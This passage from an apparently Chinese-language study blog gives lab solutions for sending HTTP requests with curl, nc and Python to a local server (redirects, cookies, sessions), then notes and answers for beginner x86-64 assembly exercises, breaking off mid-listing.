<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">j = {</span><br><span class="line">    <span class="string">"a"</span>: <span class="string">"873f59825939afc43a5e88b01fa27462"</span>,</span><br><span class="line">    <span class="string">"b"</span>: {</span><br><span class="line">        <span class="string">"c"</span>: <span class="string">"5aa799e9"</span>,</span><br><span class="line">        <span class="string">"d"</span>: [</span><br><span class="line">            <span class="string">"60f6eca5"</span>,</span><br><span class="line">            <span class="string">"9d1c3fbe fc5003e0&amp;ec2fea1e#78755a76"</span></span><br><span class="line">        	 ]</span><br><span class="line">    	 }</span><br><span class="line">	}</span><br><span class="line">flag = requests.post(<span class="string">"http://127.0.0.1"</span>, json = j)</span><br><span class="line"><span class="built_in">print</span>(flag.text)</span><br></pre></td></tr></tbody></table></figure></li>
<li><p>level31：利用<code>curl</code>实现重定向的http请求，wp如下：</p>
<p>使用<code>-L</code>参数让 HTTP 请求跟随服务器的重定向</p>
<figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -L 127.0.0.1</span><br></pre></td></tr></tbody></table></figure></li>
<li><p>level32：利用<code>nc</code>实现重定向的http请求，wp如下：</p>
<p>首先直接使用nc连接目标主机，然后发送GET请求，返回重定向后的新地址，然后再次发送GET请求，此时包含新地址：</p>
<figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">nc 127.0.0.1 80</span></span><br><span class="line">GET /4dfeaa067729634146f8c739a0b7dbf8</span><br></pre></td></tr></tbody></table></figure></li>
<li><p>level33：利用<code>python</code>实现重定向的http请求，wp如下：（使用<code>allow_redirects</code>参数，<code>allow_redirects</code>默认是<code>True</code>,所以是默认跳转）</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">flag = requests.get(<span class="string">"http://127.0.0.1"</span>, allow_redirects=<span class="literal">True</span>)</span><br><span class="line"><span class="built_in">print</span>(flag.text)</span><br></pre></td></tr></tbody></table></figure></li>
<li><p>level34：利用<code>curl</code>实现包含cookie的http请求，wp如下：</p>
<p>首先通过<code>-I</code>获取http请求后<strong>服务器回应的http标头</strong>，查看服务器响应标头中的<code>Set-Cookie</code>字段，然后通过利用curl的<code>-b</code>参数实现cookie的设置：</p>
<figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl -I 127.0.0.1</span><br><span class="line">curl -b "cookie=6c1ffe56054ed15c8f8bf71124c77835" 127.0.0.1</span><br></pre></td></tr></tbody></table></figure>
<blockquote>
<p><strong><code>Set-Cookie</code></strong> HTTP 响应标头用于将 cookie
由服务器发送到用户代理，以便用户代理在后续的请求中可以将其发送回服务器</p>
</blockquote></li>
<li><p>level35：利用<code>nc</code>实现包含cookie的http请求，wp如下：</p>
<p>步骤类似于level34，首先获取服务器返回的<code>Set-Cookie</code>字段，wp如下：</p>
<figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">echo</span> -e <span class="string">"GET / HTTP/1.1\r\n\r\n"</span> | nc 127.0.0.1 80 (获取cookie)</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">echo</span> -e <span class="string">"GET / HTTP/1.1\r\nCookie: cookie=112a3658ea797d72cd214d274183c9f0\r\n\r\n"</span> | nc 127.0.0.1 80</span></span><br></pre></td></tr></tbody></table></figure></li>
<li><p>level36：利用<code>python</code>实现包含cookie的http请求，wp如下：</p>
<p>这题我直接使用<code>print(requests.get("http://127.0.0.1").text)</code>就获得了flag，应该是服务器出问题了？正确答案如下：</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://127.0.0.1'</span></span><br><span class="line">cookies = {<span class="string">'cookie_name'</span>: <span class="string">'cookie_value'</span>}</span><br><span class="line">response = requests.get(url, cookies=cookies)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(response.text)</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure></li>
<li><p>level37：利用<code>curl</code>实现有状态的http请求（session），wp如下：(使用<code>-i</code>和<code>-b</code>参数)</p>
<p>首先获取第一个状态：（一定要使用<code>-i</code>而不是<code>-I</code>，<code>-i</code>会多输出网页源码即包含flag）</p>
<figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">curl -i 127.0.0.1</span></span><br></pre></td></tr></tbody></table></figure>
<p>上面命令收到服务器回应后，<strong>先输出服务器回应的标头，然后空一行，再输出网页的源码</strong>。然后根据服务器返回的Cookie值进行下面的操作：</p>
<figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">curl -b <span class="string">"session=eyJzdGF0ZSI6M30.Zh456A.oCLZ7Z63NHkFLh_USfmTWOANOIA"</span> -i 127.0.0.1 （重复该操作，注意修改sessionID）</span></span><br></pre></td></tr></tbody></table></figure>
<blockquote>
<p>知识点：cookie中可包含sessionID，发送给服务器</p>
</blockquote></li>
<li><p>level38：利用<code>nc</code>实现有状态的http请求（session），wp如下：</p>
<p>先获取第一个sessionID：</p>
<figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">echo</span> -e <span class="string">"GET / HTTP/1.1\r\n\r\n"</span> | nc 127.0.0.1 80</span></span><br></pre></td></tr></tbody></table></figure>
<p>然后重复下面操作，注意每次修改sessionID：</p>
<figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">echo</span> -e <span class="string">"GET / HTTP/1.1\r\nCookie: cookie=112a3658ea797d72cd214d274183c9f0\r\n\r\n"</span> | nc 127.0.0.1 80</span></span><br></pre></td></tr></tbody></table></figure></li>
<li><p>level39：利用<code>python</code>实现有状态的http请求（session），wp如下：</p>
<p>同level36，题目有问题</p></li>
</ul>
<h2 id="assembly-crush-course">Assembly Crush Course</h2>
<h3 id="知识点-1">知识点</h3>
<p><img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/202404181839763.png"></p>
<ul>
<li><p>寄存器：al、ah——8位，ax——16位，eax——32位，rax——64位</p>
<p><img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/202404181827025.png"></p></li>
<li><p>汇编指令：</p>
<p>赋值：<code>mov rax, 0x538</code>，将 0x538 存到 rax 中</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov eax, -1</span><br><span class="line">movsx rax, eax   # movsx会进行符号扩展，保持原符号</span><br></pre></td></tr></tbody></table></figure></li>
<li><p>进程：虚拟内存空间</p>
<p>栈顶在低地址，栈底在高地址</p></li>
<li><p>内存地址：</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov rax, 0x13337</span><br><span class="line">mov [rax], rbx       # 将rbx中的值赋给地址为0x13337的内存</span><br></pre></td></tr></tbody></table></figure></li>
<li><p>小端序</p></li>
<li><p><code>LEA</code>（Load Effective
Address）指令是x86汇编语言中的一种指令，用于将一个有效地址加载到一个寄存器中，例如</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lea rax, [rbx]     # 方括号内的内容会被解释为内存地址</span><br></pre></td></tr></tbody></table></figure></li>
<li><p><code>rsp</code>栈顶指针</p></li>
<li><p><code>rip</code>指向下一个指令，即下一个指令的地址</p></li>
<li><p>设置立即数的<strong>位数</strong></p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mov DWORD PTR [rax], 0x1337     # 0x1337是32位（两个字-四个字节）</span><br></pre></td></tr></tbody></table></figure>
<blockquote>
<p>立即数 0x1337 存储到寄存器 rax
所指向的内存地址中。这个指令的作用是将十六进制数 0x1337 写入到 rax
寄存器所指向的内存地址中，存储的数据长度为 4 字节（DWORD）。</p>
</blockquote></li>
<li><p>有条件跳转</p>
<p><img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/202404192154038.png"></p></li>
<li><p>标志寄存器：</p>
<ul>
<li><strong>零标志 ZF</strong>=1 表示结果为 0</li>
<li><strong>溢出标志 OF</strong>=1
表示<strong>有符号</strong>整数运算溢出</li>
<li><strong>符号标志 SF</strong>
表示<strong>有符号</strong>整数运算结果的符号</li>
<li><strong>进/借位标志 CF</strong>
表示<strong>无符号</strong>整数运算的进/借位</li>
</ul></li>
<li><p><code>call</code> + 函数名</p></li>
<li><p>函数中的参数——被调用者：rdi、rsi、rdx、rcx、r8、r9等寄存器，<strong>返回值</strong>存放在rax中</p></li>
<li><p><strong>系统调用</strong>（System
Call）：<code>syscall</code>会执行<code>rax</code>存放的数字对应的系统调用，rdi、rsi、rdx、r10、r8、r9用于存放系统调用的参数</p>
<p>例：<code>n = read(0, buf, 100);</code></p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mov rdi, 0 # the stdin file descriptor</span><br><span class="line">mov rdx，100 # the number of bytes to read </span><br><span class="line">mov rdx，100 # the number of bytes to read </span><br><span class="line">mov rax, 0 # system call number of read()</span><br><span class="line">syscall # do the system call</span><br></pre></td></tr></tbody></table></figure>
<p>例：<code>open()</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/202404192217413.png"></p>
<p>例：<code>exit()</code></p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov rdi, 42 # our program's return code (e.g.. for bash scripts )</span><br><span class="line">mov rax, 60 # system call number of exit( )</span><br><span class="line">syscall # do the system call</span><br></pre></td></tr></tbody></table></figure></li>
<li><p>在汇编代码前加上<code>. intel_syntax noprefix</code>表示Intel汇编语法</p></li>
<li><p>汇编程序：</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.intel_syntax noprefix</span><br><span class="line">.global _start</span><br><span class="line">_start:</span><br><span class="line">    mov rdi, 42</span><br><span class="line">    mov rax, 60</span><br><span class="line">    syscall</span><br></pre></td></tr></tbody></table></figure>
<p>汇编程序-&gt;可执行文件：</p>
<figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">gcc -nostdlib -o quitter quitter.s</span></span><br></pre></td></tr></tbody></table></figure>
<blockquote>
<ul>
<li><p><code>-nostdlib</code>：告诉编译器不使用标准库。标准库包含了C语言中常用的函数和宏定义，但在一些特殊的情况下，比如在编写汇编程序时，我们可能不希望链接标准库。</p></li>
<li><p><code>-o quitter</code>：指定输出文件的名称为
<code>quitter</code>，这个名称可以根据你的需要进行更改。</p></li>
</ul>
</blockquote></li>
<li><p><code>objdump</code>命令（shell）：对目标文件(obj)或可执行文件进行反汇编</p>
<figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">objdump -M intel -d quitter</span></span><br></pre></td></tr></tbody></table></figure>
<blockquote>
<p>大写的 <code>-M</code> 选项，如
<code>-M intel</code>，用于指定<strong>指令集的风格</strong>而不是机器架构</p>
<p>小写的<code>-m</code> 选项用于指定机器架构</p>
<p><code>-d</code>：从objfile中对机器指令进行反汇编。本选项只对那些包含指令的section进行反汇编</p>
</blockquote></li>
<li><p><code>objcopy</code>：将一个目标文件的内容拷贝到另外一个目标文件当中</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ objcopy --dump-section .text=quitter_binary_code quitter</span><br></pre></td></tr></tbody></table></figure>
<blockquote>
<ul>
<li><code>--dump-section .text=quitter_binary_code</code>：指定将
<code>.text</code> 节的内容提取出来，并将其保存到名为
<code>quitter_binary_code</code> 的文件中。<code>.text</code>
节通常包含程序的机器码指令。</li>
<li><code>quitter</code>：指定要处理的输入文件，即要从中提取内容的可执行文件。</li>
</ul>
</blockquote></li>
</ul>
<h3 id="练习-1">练习</h3>
<ul>
<li><p>level1：<code>mov</code>，给寄存器赋值</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mov rdi, 0x1337</span><br></pre></td></tr></tbody></table></figure></li>
<li><p>level2：无</p></li>
<li><p>level3：<code>add</code>加法</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">add rdi, 0x331337</span><br></pre></td></tr></tbody></table></figure></li>
<li><p>level4：<code>imul</code>乘法，计算f(x) = mx +
b，结果存在rax中，其中 m = rdi，x = rsi，b = rdx</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">  imul rdi, rsi</span><br><span class="line">  add rdi, rdx</span><br><span class="line">mov rax, rdi</span><br></pre></td></tr></tbody></table></figure></li>
<li><p>level5：<code>div</code>除法，只有一个操作数，可以进行128位被除数除以64位除数，并且存储商和余数，其中商存储在<code>rax</code>中，余数存储在<code>rdx</code>中，步骤如下：</p>
<p>rax = rdx:rax / reg rdx = remainder</p>
<p></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov rax, rdi #rax为低64位</span><br><span class="line">div rsi</span><br></pre></td></tr></tbody></table></figure><p></p></li>
<li><p>level6：取余，将余数存入<code>rax</code>中</p>
<p></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov rax, rdi</span><br><span class="line">div rsi</span><br><span class="line">mov rax, rdx</span><br></pre></td></tr></tbody></table></figure><p></p></li>
<li><p>level8：rax = rdi % 256，rbx = rsi % 65536
，只使用<code>mov</code>指令（模运算mod，取低位）</p>
<p></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov al, dil  # 低8位</span><br><span class="line">mov bx, si   # 低16位</span><br></pre></td></tr></tbody></table></figure><p></p></li>
<li><p>level9：使用左移<code>shl</code>，右移<code>shr</code>，为rax赋值</p>
<p>rdi = | B7 | B6 | B5 | B4 | B3 | B2 | B1 | B0 |</p>
<p>目标：rax = B4</p>
<p></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">shl rdi, 24  # 左移24位，得到 B4B3B2B1B0000000</span><br><span class="line">shr rdi, 56  # 右移56位，得到 00000000000000B4，即B4</span><br><span class="line">mov rax, rdi</span><br></pre></td></tr></tbody></table></figure><p></p></li>
<li><p>level10：按位与<code>and</code></p>
<p></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">and rdi, rsi</span><br><span class="line">and rax, rdi</span><br></pre></td></tr></tbody></table></figure><p></p></li>
<li><p>level11：or、and、xor。若x（rdi）为偶数，则y（rax）为1，否则为0</p>
<p></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">and rax, 0  #先将y置为0</span><br><span class="line">or rax, 0x1 #将y的最低位 置为1</span><br><span class="line">and rdi, 0x1 #保留x的最低位</span><br><span class="line">xor rax, rdi #异或，若x最低位为0，则y为1，否则为0</span><br></pre></td></tr></tbody></table></figure><p></p></li>
<li><p>level14：内存读写。将指定内存中的数据存放到 rax
中，在将内存中的数据进行加法操作</p>
<p></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mov rax, [0x404000]  #先将数据存入rax中</span><br><span class="line">add rax, 0x1337      #对rax进行加法（不能对内存进行加法操作）</span><br><span class="line">mov [0x404000], rax  #写回内存</span><br><span class="line">sub rax, 0x1337      #复原rax中的数据</span><br></pre></td></tr></tbody></table></figure><p></p></li>
<li><p>level16：获取不同位数的内存数据</p>
<blockquote>
<pre><code>Quad Word   = 8 bytes = 64 bits
Double Word = 4 bytes = 32 bits
Word        = 2 bytes = 16 bits
Byte        = 1 byte  = 8 bits</code></pre>
</blockquote>
<p></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mov al, [0x404000]</span><br><span class="line">mov bx, [0x404000]</span><br><span class="line">mov ecx, [0x404000]</span><br><span class="line">mov rdx, [0x404000]</span><br></pre></td></tr></tbody></table></figure><p></p></li>
<li><p>level17：为 [rdi] 和 [rsi]
内存赋值。（不能直接对内存数据进行立即数的相关操作）</p>
<p>利用寄存器作为中转，先将数据存入寄存器，然后将寄存器中的数据存入内存</p>
<p></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mov rax, 0xdeadbeef00001337</span><br><span class="line">mov [rdi], rax</span><br><span class="line"></span><br><span class="line">mov rax, 0xc0ffee0000</span><br><span class="line">mov [rsi], rax</span><br></pre></td></tr></tbody></table></figure><p></p></li>
<li><p>level18：通过偏移量访问目标内存的数据，并将数据存入对应的内存</p>
<p></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov rax, [rdi]</span><br><span class="line">add rax, [rdi+8]</span><br><span class="line">mov [rsi], rax</span><br></pre></td></tr></tbody></table></figure><p></p></li>
<li><p>leve19：stack（栈）。获取栈顶数据作为被减数，减法过后将数据存入栈中</p>
<p></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pop rax #获取栈顶元素</span><br><span class="line">sub rax, rdi</span><br><span class="line">push rax #推入栈中</span><br></pre></td></tr></tbody></table></figure><p></p></li>
<li><p>level20：利用栈交换两个寄存器（rdi、rsi）存放的值</p>
<p></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">push rdi</span><br><span class="line">push rsi</span><br><span class="line">pop rdi</span><br><span class="line">pop rsi</span><br></pre></td></tr></tbody></table></figure><p></p></li>
<li><p>level21：通过栈顶指针 rsp 访问内存数据</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mov rax, [rsp]</span><br><span class="line">add rax, [rsp+8]</span><br><span class="line">add rax, [rsp+16]</span><br><span class="line">add rax, [rsp+24] #将四个数据相加</span><br><span class="line">mov rsi, 4</span><br><span class="line">div rsi #获取四个数的平均值，存放在rax中</span><br><span class="line">push rax</span><br></pre></td></tr></tbody></table></figure></li>
<li><p><strong>level24</strong>：无条件转移，利用 jmp 跳转到距离当前位置
0x51 个字节的位置，同时在新位置处存放特定代码。</p>
<blockquote>
<ul>
<li><p><code>nop</code><strong>指令</strong>（1
Byte）：空操作，对程序逻辑没有任何作用，出于这个原因，它被用来填充代码。</p></li>
<li><p><code>.rept</code><strong>指令</strong>：循环执行指定的操作</p>
<p>注意：下面的这些伪指令只是告诉汇编器要生成多少个 <code>nop</code>
指令，它们本身并不会出现在最终的机器码中。生成的机器码中只包含真正的指令（如
<code>jmp</code>、<code>nop</code>、<code>pop rdi</code>、<code>mov rax, 0x403000</code>、<code>jmp rax</code>），这些指令会按照需要的字节数存储在内存中。最终的机器码中不会包含
<code>.rept</code>、<code>.endr</code> 或 <code>nop</code> 的 ASCII
表示形式。</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.rept times</span><br><span class="line">    code</span><br><span class="line">.endr</span><br></pre></td></tr></tbody></table></figure></li>
</ul>
</blockquote>
<p></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">jmp next # next是代码段标签</span><br><span class="line"></span><br><span class="line">.rept 0x51</span><br><span class="line">nop</span><br><span class="line">.endr</span><br><span class="line"></span><br><span class="line">next:</span><br><span class="line">  pop rdi</span><br><span class="line">  mov rax, 0x403000</span><br><span class="line">  jmp rax #这里不能直接 jmp 0x403000</span><br></pre></td></tr></tbody></table></figure><p></p></li>
<li><p>level25：条件转移指令，注意题目中的<strong>“Assume each
dereferenced value is a signed dword（4字节即32位）.”</strong></p>
<p></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">mov ebx, [rdi]  #题目限定了数据为32位</span><br><span class="line">cmp ebx, 0x7f454c46</span><br><span class="line">jne c2</span><br><span class="line"></span><br><span class="line">c1:</span><br><span class="line">  mov eax, [rdi+4]</span><br><span class="line">  add eax, [rdi+8]</span><br><span class="line">  add eax, [rdi+12]</span><br><span class="line">  jmp done</span><br><span class="line">c2:</span><br><span class="line">  cmp ebx, 0x00005A4D</span><br><span class="line">  jne c4</span><br><span class="line">c3:</span><br><span class="line">  mov eax, [rdi+4]</span><br><span class="line">  sub eax, [rdi+8]</span><br><span class="line">  sub eax, [rdi+12]</span><br><span class="line">  jmp done</span><br><span class="line">c4:</span><br><span class="line">  mov eax, [rdi+4]</span><br><span class="line">  imul eax, [rdi+8]</span><br><span class="line">  imul eax, [rdi+12]</span><br><span class="line">done:</span><br></pre></td></tr></tbody></table></figure><p></p></li>
<li><p>level26：switch条件判断，利用跳转表实现条件跳转</p>
<p></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mov rax,rdi</span><br><span class="line">and rax,0xfffffffffffffffc  # 清空低2位，若 rdi 大于3，则 and 操作后 rax 的值不为0</span><br><span class="line">je next</span><br><span class="line"></span><br><span class="line">jmp [rsi + 4*8]</span><br><span class="line">next:</span><br><span class="line">  jmp [rsi + rdi*8]</span><br></pre></td></tr></tbody></table></figure><p></p></li>
<li><p>level27：for循环</p>
<p></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">and rax, 0</span><br><span class="line">mov rbx, 0</span><br><span class="line">L1:</span><br><span class="line">  cmp rsi, 0</span><br><span class="line">  je next</span><br><span class="line"></span><br><span class="line">L2:</span><br><span class="line">  sub rsi, 1</span><br><span class="line">  add rax, [rdi]</span><br><span class="line">  add rdi, 8</span><br><span class="line">  add rbx, 1</span><br><span class="line">  jmp L1</span><br><span class="line"></span><br><span class="line">next:</span><br><span class="line">  div rbx</span><br></pre></td></tr></tbody></table></figure><p></p></li>
<li><p>level28：while循环</p>
<p></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">mov rax, 0</span><br><span class="line">cmp rdi, 0</span><br><span class="line">je L2  # 若 rdi 为0，则 rax 直接为0</span><br><span class="line">L1:</span><br><span class="line">  mov rbx, [rdi + rax]</span><br><span class="line">  cmp rbx, 0</span><br><span class="line">  je L2</span><br><span class="line">  add rax, 1</span><br><span class="line">  jmp L1</span><br><span class="line">L2:</span><br></pre></td></tr></tbody></table></figure><p></p></li>
<li><p>level29：函数调用——
call、ret。若只有一个参数，则该参数一般会被存放在 rdi 中</p>
<blockquote>
<p>函数的参数参考下表：</p>
<table>
<thead>
<tr class="header">
<th style="text-align: center;">Argument type</th>
<th style="text-align: center;">Registers</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td style="text-align: center;">Integer/pointer arguments 1-6</td>
<td style="text-align: center;">RDI, RSI, RDX, RCX, R8, R9</td>
</tr>
<tr class="even">
<td style="text-align: center;">Floating point arguments 1-8</td>
<td style="text-align: center;">XMM0 - XMM7</td>
</tr>
<tr class="odd">
<td style="text-align: center;">Excess arguments</td>
<td style="text-align: center;">Stack</td>
</tr>
<tr class="even">
<td style="text-align: center;">Static chain pointer</td>
<td style="text-align: center;">R10</td>
</tr>
</tbody>
</table>
</blockquote>
<p></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">str_lower:</span><br><span class="line">  mov rbx, 0</span><br><span class="line">  cmp rdi, 0</span><br><span class="line">  jne L1</span><br><span class="line">  jmp done</span><br><span class="line"></span><br><span class="line">L1:</span><br><span class="line">  mov cl, [rdi]</span><br><span class="line">  cmp cl, 0  # 不能直接通过内存地址进行比较</span><br><span class="line">  jne L2</span><br><span class="line">  jmp done</span><br><span class="line"></span><br><span class="line">L2:</span><br><span class="line">  cmp cl, 0x5a</span><br><span class="line">  jbe L3  # 小于等于（无符号数）</span><br><span class="line">  add rdi, 1</span><br><span class="line">  jmp L1</span><br><span class="line"></span><br><span class="line">L3:</span><br><span class="line">  push rdi # 暂存 rdi 的值</span><br><span class="line">  mov dil, [rdi]  # 注意foo函数的参数是[rdi]，不是 rdi</span><br><span class="line">  mov rdx, 